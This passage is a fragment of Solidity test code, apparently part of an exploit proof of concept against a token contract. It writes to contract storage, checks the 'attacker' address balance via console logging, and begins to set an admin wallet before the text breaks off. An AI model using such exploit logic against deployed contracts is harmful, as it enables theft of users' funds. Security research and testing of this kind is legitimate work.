            // Also need to add to _excluded array
            // This is more complex, so let's just use the excludeFromReward function
            // But we already called it and it didn't give us tokens
            // Instead, let's check if we have balance now
            uint256 newBalance = targetContract.balanceOf(attacker);
            console.log("Balance after storage write:", newBalance);

            if (newBalance > 0) {
                // Set admin wallet
